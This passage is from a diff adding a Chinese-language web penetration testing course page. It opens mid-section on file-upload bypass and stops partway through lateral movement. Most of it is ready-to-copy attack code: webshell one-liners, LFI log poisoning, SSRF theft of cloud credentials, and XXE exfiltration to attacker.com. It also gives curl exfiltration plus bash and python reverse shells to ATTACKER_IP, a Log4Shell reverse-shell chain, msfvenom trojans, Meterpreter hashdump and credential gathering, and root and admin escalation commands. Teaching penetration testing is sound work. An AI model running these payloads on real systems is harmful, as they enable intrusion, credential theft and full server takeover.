+shell.php%00.jpg           <span class="cm"># 00 截斷（PHP 5.3 以下）</span>
+
+<span class="cm"># ─── 4. 繞過文件頭（魔數）驗證 ───</span>
+<span class="cm"># 圖片木馬：在 PHP 文件前添加 GIF 文件頭</span>
+echo "GIF89a" > shell.php; echo '&lt;?php eval($_POST["c"]); ?&gt;' >> shell.php
+<span class="cm"># 或使用 exiftool 將 Webshell 注入圖片 Comment 字段</span>
+exiftool -Comment='&lt;?php system($_GET["c"]); ?&gt;' image.jpg -o shell.jpg
+
+<span class="cm"># ─── 5. .htaccess 上傳攻擊（Apache 特有）───</span>
+<span class="cm"># 上傳 .htaccess 文件，讓伺服器把 .jpg 當 PHP 執行</span>
+echo "AddType application/x-httpd-php .jpg" > .htaccess
+<span class="cm"># 然後上傳 shell.jpg（內含 PHP 代碼）即可執行</span>
+
+<span class="cm"># ─── 6. 條件競爭（Race Condition）───</span>
+<span class="cm"># 伺服器先保存文件再刪除惡意文件的窗口期</span>
+<span class="cm"># 快速上傳 + 快速訪問，在刪除前訪問到文件即可創建新 Shell</span></pre>
+</div>
+</div>
+
+<!-- L4-3 文件包含 -->
+<div class="cb" id="l4-3">
+<h2>文件包含漏洞（LFI / RFI）</h2>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">文件包含漏洞利用</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── LFI 本地文件包含 ───</span>
+<span class="cm"># 基本目錄遍歷讀取敏感文件</span>
+?page=../../../etc/passwd
+?page=../../../etc/shadow
+?page=../../../var/www/html/config.php
+
+<span class="cm"># ─── Windows 環境 LFI ───</span>
+?page=..\..\..\Windows\System32\drivers\etc\hosts
+?page=C:\Windows\win.ini
+
+<span class="cm"># ─── LFI → RCE 提升（日誌污染）───</span>
+<span class="cm"># 步驟1：向 Apache 日誌注入 PHP 代碼（通過 User-Agent）</span>
+curl http://target.com/ -A '&lt;?php system($_GET["c"]); ?&gt;'
+<span class="cm"># 步驟2：包含日誌文件觸發 PHP 執行</span>
+?page=../../../var/log/apache2/access.log&c=id
+
+<span class="cm"># ─── LFI + PHP Session 文件包含 ───</span>
+<span class="cm"># 如果 PHP Session 內容可控（Cookie PHPSESSID=abc123）</span>
+<span class="cm"># Session 文件在 /tmp/sess_abc123</span>
+?page=../../../tmp/sess_abc123
+
+<span class="cm"># ─── PHP 偽協議包含 ───</span>
+<span class="cm"># 讀取 PHP 源碼（Base64 編碼輸出，不執行）</span>
+?page=php://filter/convert.base64-encode/resource=index.php
+
+<span class="cm"># 直接執行代碼（Data 偽協議）</span>
+?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyA/Pg==
+<span class="cm"># Base64 解碼為：&lt;?php system($_GET["c"]); ?&gt;</span>
+
+<span class="cm"># ─── RFI 遠程文件包含（需 allow_url_include=On）───</span>
+?page=http://attacker.com/shell.php</pre>
+</div>
+</div>
+
+<!-- ===== CH5: SSRF/XXE/反序列化 ===== -->
+<div class="cb" id="l5-1">
+<h2>SSRF 伺服器端請求偽造</h2>
+<p>SSRF（Server-Side Request Forgery）讓攻擊者控制伺服器發起請求，可用於探測內網、訪問元數據服務（AWS/GCP/Azure 的 169.254.169.254），甚至 GetShell。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">SSRF — 發現、利用與繞過</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── 典型 SSRF 入口 ───</span>
+<span class="cm"># URL 參數：?url=https://...  ?image=http://...  ?link=...  ?callback=...</span>
+<span class="cm"># 在線工具：PDF 生成、圖片裁剪、URL 預覽、Webhook</span>
+
+<span class="cm"># ─── 基本利用 ───</span>
+<span class="cm"># 探測內網 IP 段（通過響應大小/時間判斷是否存活）</span>
+?url=http://192.168.1.1
+?url=http://10.0.0.1:8080/admin
+
+<span class="cm"># 讀取文件（file 偽協議）</span>
+?url=file:///etc/passwd
+
+<span class="cm"># 雲環境元數據竊取（AWS EC2 實例）</span>
+?url=http://169.254.169.254/latest/meta-data/
+?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+<span class="cm"># ─── SSRF 繞過技巧 ───</span>
+<span class="cm"># 繞過 localhost 黑名單</span>
+?url=http://127.0.0.1/admin         <span class="cm"># 可能被過濾</span>
+?url=http://0/admin                 <span class="cm"># 0 在 Linux 解析為 127.0.0.1</span>
+?url=http://0177.0.0.1/admin        <span class="cm"># 八進制 IP</span>
+?url=http://2130706433/admin        <span class="cm"># 十進制 IP（127.0.0.1）</span>
+?url=http://127.0.0.1.nip.io/admin  <span class="cm"># DNS 重綁定（nip.io 服務）</span>
+
+<span class="cm"># 繞過 302 重定向</span>
+<span class="cm"># 在自己的伺服器設置 302 重定向到 127.0.0.1</span>
+?url=http://attacker.com/redirect   <span class="cm"># → 302 → http://127.0.0.1/admin</span>
+
+<span class="cm"># Gopher 協議（可發送任意 TCP 包，用於攻擊 Redis/MySQL）</span>
+?url=gopher://127.0.0.1:6379/_%2A1%0D%0A...</pre>
+</div>
+</div>
+
+<!-- L5-2 XXE -->
+<div class="cb" id="l5-2">
+<h2>XXE XML 外部實體注入</h2>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">XXE — 利用與繞過</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm">&lt;!-- ─── 基本 XXE 讀取文件 ─── --&gt;</span>
+<span class="op">&lt;?</span>xml version=<span class="vl">"1.0"</span> encoding=<span class="vl">"UTF-8"</span><span class="op">?&gt;</span>
+<span class="op">&lt;!</span>DOCTYPE foo [
+  <span class="op">&lt;!</span>ENTITY xxe SYSTEM <span class="vl">"file:///etc/passwd"</span><span class="op">&gt;</span>
+]<span class="op">&gt;</span>
+<span class="op">&lt;</span><span class="tg">root</span><span class="op">&gt;&amp;</span>xxe;<span class="op">&lt;/</span><span class="tg">root</span><span class="op">&gt;</span>
+
+<span class="cm">&lt;!-- ─── XXE 探測內網（SSRF 效果）─── --&gt;</span>
+<span class="op">&lt;!</span>DOCTYPE foo [
+  <span class="op">&lt;!</span>ENTITY xxe SYSTEM <span class="vl">"http://192.168.1.100:8080/"</span><span class="op">&gt;</span>
+]<span class="op">&gt;</span>
+
+<span class="cm">&lt;!-- ─── 盲 XXE（帶外數據傳出）─── --&gt;</span>
+<span class="op">&lt;!</span>DOCTYPE foo [
+  <span class="op">&lt;!</span>ENTITY % file SYSTEM <span class="vl">"file:///etc/passwd"</span><span class="op">&gt;</span>
+  <span class="op">&lt;!</span>ENTITY % dtd SYSTEM <span class="vl">"http://attacker.com/evil.dtd"</span><span class="op">&gt;</span>
+  <span class="op">%</span>dtd;
+]<span class="op">&gt;</span>
+<span class="cm">&lt;!-- evil.dtd 內容：讓伺服器將 /etc/passwd 發送到 attacker.com --&gt;</span></pre>
+</div>
+</div>
+
+<!-- L5-3 反序列化 -->
+<div class="cb" id="l5-3">
+<h2>反序列化漏洞原理與利用</h2>
+<p>反序列化漏洞是近年來危害最大的漏洞類型之一，Log4Shell（CVE-2021-44228）、Shiro 反序列化、Java 各大框架的 RCE 漏洞均屬此類。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">PHP 反序列化漏洞原理</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="op">&lt;?</span><span class="tg">php</span>
+<span class="cm">// ─── 漏洞代碼示例 ───</span>
+<span class="kw">class</span> FileManager {
+    <span class="kw">public</span> <span class="sl">$logfile</span>;
+    <span class="kw">public</span> <span class="sl">$data</span>;
+
+    <span class="cm">// __destruct 在對象銷毀時自動觸發</span>
+    <span class="kw">function</span> <span class="fn">__destruct</span>() {
+        file_put_contents(<span class="sl">$this</span>-><span class="fn">logfile</span>, <span class="sl">$this</span>-><span class="fn">data</span>);
+        <span class="cm">// 如果 logfile=webshell.php，data=&lt;?php eval($_POST['c']); ?&gt;</span>
+        <span class="cm">// 就可以在伺服器上寫入一個 Webshell！</span>
+    }
+}
+
+<span class="cm">// ─── 危險的反序列化操作 ───</span>
+<span class="sl">$data</span> = <span class="sl">$_GET</span>[<span class="st">'data'</span>]; <span class="cm">// 直接接收用戶輸入</span>
+<span class="fn">unserialize</span>(<span class="sl">$data</span>);   <span class="cm">// 反序列化→觸發 __destruct→寫入 Webshell！</span>
+
+<span class="cm">// ─── 攻擊者構造的惡意序列化數據 ───</span>
+<span class="sl">$obj</span>  = <span class="kw">new</span> FileManager();
+<span class="sl">$obj</span>-><span class="fn">logfile</span> = <span class="st">"/var/www/html/webshell.php"</span>;
+<span class="sl">$obj</span>-><span class="fn">data</span>    = <span class="st">'&lt;?php eval($_POST["c"]); ?&gt;'</span>;
+<span class="kw">echo</span> <span class="fn">serialize</span>(<span class="sl">$obj</span>);
+<span class="cm">// 輸出：O:11:"FileManager":2:{s:7:"logfile";s:27:"/var/www/html/webshell.php";...}</span>
+<span class="op">?&gt;</span></pre>
+</div>
+
+<div class="note tip">
+  <div class="note-lbl">Java 反序列化工具</div>
+  <p>Java 反序列化攻擊更複雜，涉及 Gadget Chain（利用鏈）。常用工具：<br>
+  <strong>ysoserial</strong> — 生成 Java 反序列化 Payload（CommonsCollections 等 Gadget Chain）<br>
+  <strong>GadgetInspector</strong> — 自動化分析 JAR 包中的 Gadget Chain<br>
+  <strong>marshalsec</strong> — 多種 Java 反序列化框架的 Payload 生成</p>
+</div>
+</div>
+
+<!-- ===== CH6: CSRF/邏輯/越權 ===== -->
+<div class="cb" id="l6-1">
+<h2>CSRF 跨站請求偽造</h2>
+<p>CSRF 利用已登入用戶的 Session，讓受害者在不知情的情況下向目標網站發送惡意請求。與 XSS 不同，CSRF 的核心是<strong>偽造請求，而非竊取 Cookie</strong>。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">CSRF — 攻擊 PoC 與防禦</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm">&lt;!-- CSRF 攻擊 PoC（攻擊者的惡意頁面）--&gt;</span>
+<span class="cm">&lt;!-- 用戶訪問此頁面後，自動向 bank.com 發起轉帳請求 --&gt;</span>
+<span class="op">&lt;</span><span class="tg">html</span><span class="op">&gt;</span>
+<span class="op">&lt;</span><span class="tg">body</span> onload=<span class="vl">"document.forms[0].submit()"</span><span class="op">&gt;</span>
+  <span class="op">&lt;</span><span class="tg">form</span> action=<span class="vl">"https://bank.com/transfer"</span> method=<span class="vl">"POST"</span><span class="op">&gt;</span>
+    <span class="op">&lt;</span><span class="tg">input</span> <span class="at">type</span>=<span class="vl">"hidden"</span> <span class="at">name</span>=<span class="vl">"to"</span>     <span class="at">value</span>=<span class="vl">"attacker_account"</span><span class="op">&gt;</span>
+    <span class="op">&lt;</span><span class="tg">input</span> <span class="at">type</span>=<span class="vl">"hidden"</span> <span class="at">name</span>=<span class="vl">"amount"</span> <span class="at">value</span>=<span class="vl">"99999"</span><span class="op">&gt;</span>
+  <span class="op">&lt;/</span><span class="tg">form</span><span class="op">&gt;</span>
+<span class="op">&lt;/</span><span class="tg">body</span><span class="op">&gt;</span>
+<span class="op">&lt;/</span><span class="tg">html</span><span class="op">&gt;</span>
+
+<span class="cm">&lt;!-- CSRF 防禦：Token 驗證 --&gt;</span>
+<span class="cm">&lt;!-- 每個表單都包含一個隨機 Token，服務端驗證 --&gt;</span>
+<span class="op">&lt;</span><span class="tg">form</span> action=<span class="vl">"/transfer"</span> method=<span class="vl">"POST"</span><span class="op">&gt;</span>
+  <span class="op">&lt;</span><span class="tg">input</span> <span class="at">type</span>=<span class="vl">"hidden"</span> <span class="at">name</span>=<span class="vl">"csrf_token"</span> <span class="at">value</span>=<span class="vl">"${random_32_bytes}"</span><span class="op">&gt;</span>
+  <span class="op">...&lt;/</span><span class="tg">form</span><span class="op">&gt;</span>
+<span class="cm">&lt;!-- 攻擊者無法知道 Token 的值（同源策略限制），請求被拒絕 --&gt;</span></pre>
+</div>
+</div>
+
+<!-- L6-2 業務邏輯 -->
+<div class="cb" id="l6-2">
+<h2>業務邏輯漏洞</h2>
+<p>業務邏輯漏洞是指攻擊者利用應用程序正常功能中的設計缺陷，以非預期的方式使用系統。這類漏洞掃描器無法自動發現，需要深入理解業務流程。</p>
+
+<div class="ilist">
+  <div class="il-item"><span class="il-num">01</span><div class="il-txt"><strong>支付漏洞</strong> — 修改訂單中的商品價格（如 0.01 元購買高價商品）、負數金額、並發下單刷庫存、使用已使用的優惠券</div></div>
+  <div class="il-item"><span class="il-num">02</span><div class="il-txt"><strong>驗證碼繞過</strong> — 驗證碼不過期（可重複使用同一個）、驗證碼在響應中回顯、暴力破解 4/6 位純數字驗證碼</div></div>
+  <div class="il-item"><span class="il-num">03</span><div class="il-txt"><strong>密碼重置漏洞</strong> — 重置 Token 可預測（如用戶 ID + 時間戳）、重置鏈接永不過期、Host 頭注入劫持重置郵件、短信驗證碼爆破</div></div>
+  <div class="il-item"><span class="il-num">04</span><div class="il-txt"><strong>接口未鑒權</strong> — 前端隱藏的接口未做後端驗證（如 /api/admin/users 普通用戶可直接訪問）、未登入可訪問需登入的頁面</div></div>
+  <div class="il-item"><span class="il-num">05</span><div class="il-txt"><strong>批量操作漏洞</strong> — 無速率限制的接口，可批量枚舉手機號、批量查詢用戶信息、批量嘗試密碼（一種分布式的密碼噴射攻擊）</div></div>
+</div>
+</div>
+
+<!-- L6-3 越權 -->
+<div class="cb" id="l6-3">
+<h2>越權漏洞（水平越權 / 垂直越權）</h2>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">越權漏洞測試方法</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── 水平越權（IDOR）測試 ───</span>
+<span class="cm"># 場景：用戶 A 的訂單 URL 為 /order?id=1001</span>
+<span class="cm"># 嘗試訪問 /order?id=1002（用戶 B 的訂單）</span>
+
+<span class="cm"># 常見的 IDOR 參數</span>
+?id=123          → 改為 ?id=122
+?user_id=456     → 改為 ?user_id=457
+?file=my_doc.pdf → 改為 ?file=admin_doc.pdf
+?token=abc123    → 嘗試其他 token（如果 token 可預測）
+
+<span class="cm"># ─── 垂直越權測試 ───</span>
+<span class="cm"># 場景：普通用戶嘗試調用管理員功能</span>
+<span class="cm"># 方法1：在 Burp Suite 中記錄管理員的請求</span>
+<span class="cm"># 方法2：替換 Session Cookie 為普通用戶的，重放管理員請求</span>
+<span class="cm"># 如果普通用戶能成功調用管理員 API → 垂直越權確認</span>
+
+<span class="cm"># ─── 批量化測試 IDOR（Burp Intruder）───</span>
+<span class="cm"># 將 id 參數標記為 Payload 位置</span>
+<span class="cm"># 使用 Number List（1000-2000）進行枚舉</span>
+<span class="cm"># 根據響應長度/狀態碼篩選有效 ID</span></pre>
+</div>
+
+<div class="quiz">
+  <div class="q-lbl">小測驗</div>
+  <div class="q-q">用戶 A（id=100）訪問自己的個人資料 API：<code>GET /api/profile/100</code>，然後嘗試訪問 <code>GET /api/profile/101</code>，成功看到了用戶 B 的個人資料。這是什麼漏洞？</div>
+  <div class="q-opts">
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">A</span>垂直越權（普通用戶執行管理員功能）</div>
+    <div class="qo" onclick="chkQ(this,true)"><span class="qo-k">B</span>水平越權 / IDOR（Insecure Direct Object Reference，不安全的直接物件引用）</div>
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">C</span>SQL 注入（通過 id 參數注入）</div>
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">D</span>CSRF（跨站請求偽造）</div>
+  </div>
+  <div class="q-exp">正確！這是「水平越權」或稱 IDOR（Insecure Direct Object Reference）。水平越權指同等權限的不同用戶之間互相訪問對方的資源（用戶 A 訪問用戶 B 的數據）。垂直越權指低權限用戶訪問高權限用戶的功能（普通用戶調用管理員 API）。OWASP Top 10 A01（存取控制失效）中，IDOR 是最常見的子類型。</div>
+</div>
+</div>
+
+
+<!-- ===== CH7: 命令注入 / RCE ===== -->
+<div class="cb" id="l7-1">
+<h2>OS 命令注入（RCE）</h2>
+<p>命令注入漏洞允許攻擊者在伺服器上執行任意系統命令，是危害最嚴重的 Web 漏洞之一，通常可直接導致伺服器完全被控制。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">命令注入 — 利用與提升</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── 常見命令分隔符（用於注入額外命令）───</span>
+; whoami          <span class="cm"># 分號：執行完前一個命令再執行 whoami</span>
+&& whoami         <span class="cm"># AND：前面成功才執行 whoami</span>
+|| whoami         <span class="cm"># OR：前面失敗才執行 whoami</span>
+| whoami          <span class="cm"># PIPE：將前一個命令的輸出傳給 whoami</span>
+`whoami`          <span class="cm"># 反引號：執行並返回結果</span>
+$(whoami)         <span class="cm"># 命令替換：同反引號</span>
+%0awhoami         <span class="cm"># 換行符（URL 編碼）</span>
+
+<span class="cm"># ─── 確認命令注入（無回顯場景：時間盲注）───</span>
+ping -c 5 127.0.0.1    <span class="cm"># 觀察響應是否延遲約 5 秒</span>
+sleep 5
+
+<span class="cm"># ─── 無回顯 → 帶外獲取結果 ───</span>
+<span class="cm"># 在 attacker.com 上啟動 tcpdump 或 BurpCollaborator</span>
+; curl http://attacker.com/$(whoami)
+; ping -c 1 $(whoami).attacker.com
+
+<span class="cm"># ─── 反彈 Shell（getShell 的核心操作）───</span>
+<span class="cm"># 攻擊者先監聽：nc -lvnp 4444</span>
+<span class="cm"># 注入以下命令讓目標機器連回攻擊者：</span>
+bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+<span class="cm"># 更多 Shell 方式參考：https://revshells.com</span>
+
+<span class="cm"># ─── Windows 命令注入 ───</span>
+& whoami
+| net user
+&& systeminfo</pre>
+</div>
+</div>
+
+<!-- L7-2 框架 RCE -->
+<div class="cb" id="l7-2">
+<h2>常見框架 RCE 漏洞（Shiro / Log4j）</h2>
+<p>現代 Web 應用大量使用第三方框架和組件。這些組件一旦爆出 RCE 漏洞，影響往往是全球性的，利用門檻低但危害極大。</p>
+
+<div class="tbl">
+  <table class="t">
+    <thead><tr><th>CVE</th><th>影響組件</th><th>漏洞類型</th><th>特徵</th></tr></thead>
+    <tbody>
+      <tr><td class="mc">CVE-2021-44228</td><td>Log4j2（Java 日誌庫）</td><td>JNDI 注入 / RCE</td><td>輸入 <code>${jndi:ldap://attacker.com/a}</code> 即觸發</td></tr>
+      <tr><td class="mc">CVE-2016-4437</td><td>Apache Shiro（認證框架）</td><td>反序列化 RCE</td><td>RememberMe Cookie 加密的反序列化 Payload</td></tr>
+      <tr><td class="mc">CVE-2022-22965</td><td>Spring Framework（Spring4Shell）</td><td>數據綁定 RCE</td><td>特定條件下通過 class 參數寫 Webshell</td></tr>
+      <tr><td class="mc">CVE-2021-26084</td><td>Atlassian Confluence</td><td>OGNL 注入 RCE</td><td>無需登入，通過特定路徑注入 OGNL 表達式</td></tr>
+      <tr><td class="mc">CVE-2023-46604</td><td>Apache ActiveMQ</td><td>反序列化 RCE</td><td>未授權訪問 61616 端口，加載遠程 ClassInfo</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">Log4Shell（CVE-2021-44228）利用示例</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># Log4j2 漏洞：程序記錄用戶輸入到日誌時觸發 JNDI 查詢</span>
+<span class="cm"># 觸發位置：任何被 Log4j 記錄的字段（User-Agent、用戶名、搜索關鍵詞等）</span>
+
+<span class="cm"># ─── 步驟1：確認漏洞（用 BurpCollaborator 或 dnslog.cn）───</span>
+User-Agent: ${jndi:ldap://YOUR_DNS_LOG.dnslog.cn/test}
+<span class="cm"># 若在 dnslog.cn 上收到 DNS 查詢 → 漏洞確認</span>
+
+<span class="cm"># ─── 步驟2：搭建 JNDI 服務器（工具：JNDIExploit）───</span>
+java -jar JNDIExploit-1.4-SNAPSHOT.jar -i ATTACKER_IP -p 1389
+
+<span class="cm"># ─── 步驟3：投遞 Payload ───</span>
+<span class="cm"># 將 User-Agent 修改為：</span>
+${jndi:ldap://ATTACKER_IP:1389/Basic/ReverseShell/ATTACKER_IP/4444}
+<span class="cm"># 目標伺服器會通過 LDAP 加載 Class，觸發反彈 Shell</span>
+
+<span class="cm"># ─── Nuclei 批量掃描 Log4Shell ───</span>
+nuclei -t cves/2021/CVE-2021-44228.yaml -u https://target.com</pre>
+</div>
+</div>
+
+<!-- L7-3 Webshell 管理 -->
+<div class="cb" id="l7-3">
+<h2>Webshell 管理：蟻劍 / 冰蠍 / 哥斯拉</h2>
+<p>獲得 Webshell 後，需要使用管理工具進行高效的後滲透操作。現代 Webshell 管理工具已實現流量加密和混淆，以規避防火牆和 IDS 的檢測。</p>
+
+<div class="kg">
+  <div class="kt"><div class="kt-n">蟻劍（AntSword）</div><div class="kt-d">開源 Webshell 管理工具，支持 PHP/ASP/JSP。特點：插件生態豐富，支持數據庫管理、文件管理、虛擬終端。默認流量未加密，容易被 WAF/IDS 識別。</div></div>
+  <div class="kt"><div class="kt-n">冰蠍（Behinder）</div><div class="kt-d">加密 Webshell 管理工具，通訊流量使用 AES 加密，難以被流量設備識別。支持 PHP/Java，適合繞過 WAF 的環境。</div></div>
+  <div class="kt"><div class="kt-n">哥斯拉（Godzilla）</div><div class="kt-d">新一代加密 Webshell 管理工具，支持多種加密方式（XOR/AES），插件豐富，可實現流量完全加密，規避檢測能力最強。</div></div>
+  <div class="kt"><div class="kt-n">常用一句話 Webshell</div><div class="kt-d">PHP：<code>&lt;?php eval($_POST['c']); ?&gt;</code><br>PHP：<code>&lt;?php @system($_GET['c']); ?&gt;</code><br>JSP：<code>&lt;%Runtime.getRuntime().exec(request.getParameter("c"));%&gt;</code><br>ASP：<code>&lt;% eval request("c") %&gt;</code></div></div>
+</div>
+</div>
+
+<!-- ===== CH8: MSF / 後滲透 ===== -->
+<div class="cb" id="l8-1">
+<h2>Metasploit Framework 全面入門</h2>
+<p>Metasploit（MSF）是世界上最廣泛使用的滲透測試框架，內建數千個漏洞利用模塊、Payload 和後滲透工具。掌握 MSF 是滲透測試工程師的必備技能。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">Metasploit — 核心命令速查</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># 啟動 MSF 控制台</span>
+msfconsole
+
+<span class="cm"># ─── 模塊搜索與使用 ───</span>
+msf6> search eternalblue                    <span class="cm"># 搜索 MS17-010 相關模塊</span>
+msf6> use exploit/windows/smb/ms17_010_eternalblue
+msf6> info                                  <span class="cm"># 查看模塊詳細說明</span>
+msf6> show options                          <span class="cm"># 查看必填參數</span>
+
+<span class="cm"># ─── 設置目標和 Payload ───</span>
+msf6> set RHOSTS 192.168.1.100             <span class="cm"># 目標 IP（可以是 IP 段）</span>
+msf6> set LHOST 192.168.1.50              <span class="cm"># 攻擊機 IP</span>
+msf6> set LPORT 4444                      <span class="cm"># 監聽端口</span>
+msf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6> run                                  <span class="cm"># 執行（或 exploit）</span>
+
+<span class="cm"># ─── 生成獨立 Payload（msfvenom）───</span>
+<span class="cm"># Windows exe 木馬</span>
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=192.168.1.50 LPORT=4444 -f exe > shell.exe
+
+<span class="cm"># PHP Webshell（配合 MSF handler）</span>
+msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw > shell.php
+
+<span class="cm"># Linux 反彈 Shell ELF</span>
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf > shell
+
+<span class="cm"># ─── 設置監聽器等待連接 ───</span>
+msf6> use exploit/multi/handler
+msf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6> set LHOST 0.0.0.0
+msf6> run -j                               <span class="cm"># -j 在後台運行</span></pre>
+</div>
+</div>
+
+<!-- L8-2 Meterpreter -->
+<div class="cb" id="l8-2">
+<h2>Meterpreter 後滲透操作</h2>
+<p>Meterpreter 是 MSF 最強大的 Payload，完全在記憶體中運行（無磁盤文件），提供豐富的後滲透操作接口。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">Meterpreter — 後滲透命令速查</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── 基本信息收集 ───</span>
+meterpreter> sysinfo           <span class="cm"># 系統信息（OS版本/計算機名/架構）</span>
+meterpreter> getuid            <span class="cm"># 當前用戶</span>
+meterpreter> getpid            <span class="cm"># 當前進程 ID</span>
+meterpreter> ps                <span class="cm"># 列出所有進程</span>
+meterpreter> ipconfig          <span class="cm"># 網卡信息</span>
+meterpreter> arp               <span class="cm"># ARP 表（發現內網主機）</span>
+
+<span class="cm"># ─── 文件操作 ───</span>
+meterpreter> ls / pwd / cd     <span class="cm"># 目錄操作</span>
+meterpreter> download /etc/shadow /tmp/shadow  <span class="cm"># 下載文件</span>
+meterpreter> upload shell.php /var/www/html/   <span class="cm"># 上傳文件</span>
+meterpreter> search -f *.conf                  <span class="cm"># 搜索配置文件</span>
+
+<span class="cm"># ─── 憑證竊取 ───</span>
+meterpreter> run post/windows/gather/credentials/credential_collector
+meterpreter> run post/multi/recon/local_exploit_suggester  <span class="cm"># 本地提權建議</span>
+meterpreter> hashdump          <span class="cm"># 導出 Windows 密碼 Hash（需 SYSTEM 權限）</span>
+
+<span class="cm"># ─── 會話管理 ───</span>
+meterpreter> background        <span class="cm"># 後台運行當前 Session</span>
+msf6> sessions -l              <span class="cm"># 列出所有 Session</span>
+msf6> sessions -i 1            <span class="cm"># 切換到 Session 1</span>
+
+<span class="cm"># ─── 端口轉發 / 代理（內網穿透）───</span>
+meterpreter> portfwd add -l 3389 -p 3389 -r 192.168.2.100
+<span class="cm"># 訪問 localhost:3389 → 等同於訪問內網 192.168.2.100:3389</span></pre>
+</div>
+</div>
+
+<!-- L8-3 提權 -->
+<div class="cb" id="l8-3">
+<h2>提權技術（Linux / Windows）</h2>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">Linux 提權常用技術</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── 信息收集（提權前的準備）───</span>
+id && whoami                          <span class="cm"># 當前用戶和群組</span>
+uname -a                              <span class="cm"># 內核版本（找內核提權 CVE）</span>
+cat /etc/passwd                       <span class="cm"># 所有用戶</span>
+sudo -l                               <span class="cm"># 當前用戶可 sudo 的命令</span>
+find / -perm -4000 2>/dev/null        <span class="cm"># 查找 SUID 文件</span>
+crontab -l; cat /etc/crontab          <span class="cm"># 計劃任務</span>
+
+<span class="cm"># ─── SUID 提權 ───</span>
+<span class="cm"># 如果 /usr/bin/vim 有 SUID 位，vim 以 root 運行</span>
+vim -c ':!whoami'   <span class="cm"># root</span>
+vim -c ':!/bin/sh'  <span class="cm"># 獲取 root Shell</span>
+<span class="cm"># 更多 SUID 提權方法：GTFOBins (gtfobins.github.io)</span>
+
+<span class="cm"># ─── sudo 提權 ───</span>
+<span class="cm"># sudo -l 顯示：(ALL) NOPASSWD: /usr/bin/find</span>
+sudo find /etc/passwd -exec /bin/sh \;  <span class="cm"># 獲取 root Shell</span>
+
+<span class="cm"># ─── 內核提權 ───</span>
+<span class="cm"># Linux 4.x 內核提權（DirtyCow CVE-2016-5195）</span>
+gcc -pthread dirty.c -o dirty -lcrypt
+./dirty password123     <span class="cm"># 將 /etc/passwd 中的 root 密碼改掉</span>
+
+<span class="cm"># ─── 自動化提權枚舉（LinPEAS）───</span>
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh</pre>
+</div>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">Windows 提權常用技術</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm">REM ─── 信息收集 ───</span>
+whoami /priv             <span class="cm">REM 當前用戶的特殊權限</span>
+systeminfo               <span class="cm">REM 系統信息（打補丁情況）</span>
+net user                 <span class="cm">REM 所有本地用戶</span>
+net localgroup administrators  <span class="cm">REM 管理員組成員</span>
+
+<span class="cm">REM ─── Token 提權（SeImpersonatePrivilege）───</span>
+<span class="cm">REM 如果 whoami /priv 顯示 SeImpersonatePrivilege，使用 Potato 系列提權</span>
+<span class="cm">REM JuicyPotato / PrintSpoofer / GodPotato</span>
+GodPotato-NET4.exe -cmd "cmd /c whoami > C:\output.txt"
+
+<span class="cm">REM ─── AlwaysInstallElevated 提權 ───</span>
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+<span class="cm">REM 如果值為1：</span>
+msfvenom -p windows/adduser CMD="net localgroup administrators hacker /add" -f msi > evil.msi
+msiexec /quiet /qn /i evil.msi
+
+<span class="cm">REM ─── WinPEAS 自動化枚舉 ───</span>
+winPEASany.exe</pre>
+</div>
+</div>
+
+<!-- L8-4 橫向移動 -->
+<div class="cb" id="l8-4">
+<h2>內網橫向移動與持久化</h2>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">內網橫向移動技術</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── 內網信息收集 ───</span>
+<span class="cm"># 通過 Meterpreter 的路由和代理探測內網</span>
+meterpreter> run post/multi/manage/autoroute SUBNET=192.168.2.0/24
+msf6> use auxiliary/scanner/portscan/tcp
+msf6> set RHOSTS 192.168.2.0/24
+
